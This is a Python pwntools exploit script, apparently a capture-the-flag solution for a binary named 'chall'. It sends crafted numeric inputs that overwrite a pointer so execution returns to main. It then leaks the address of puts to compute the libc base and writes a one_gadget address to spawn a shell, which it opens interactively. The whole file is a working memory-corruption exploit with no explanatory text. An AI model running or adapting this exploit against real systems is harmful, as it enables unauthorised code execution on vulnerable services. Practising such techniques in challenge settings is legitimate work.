from pwn import *
import subprocess
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

# gdb_script = 'b* 0x4008B8\nb* 0x400905'
gdb_script = 'b* 0x400883\n'

DEBUG = [False, True][int(sys.argv[1])]
if DEBUG:
    r = process('./chall')
    gdb.attach(r, gdb_script)
else:
    r = remote('')

elf = ELF('./chall')
main = 0x4007D6
libc = ELF('./libc.so.6')

one_gadgets = map(int,subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).split(' '))

go = lambda x: r.sendlineafter('> ', str(x))
ii = lambda x: r.sendafter(': ', str(x))


ii(1000000)
ii(1008872-0x10)
ii(6295576)
r.send(p64(main))
libc_puts = int((r.recvuntil('\n')).split(': ')[-1],16)
libc_base = libc_puts - libc.sym['puts']
one_gadget = libc_base + one_gadgets[1]
log.info('libc base: 0x%x' % libc_base)

ii(1000000)
ii(7283928+1)
ii(6295576)
r.send(p64(one_gadget))

r.interactive()
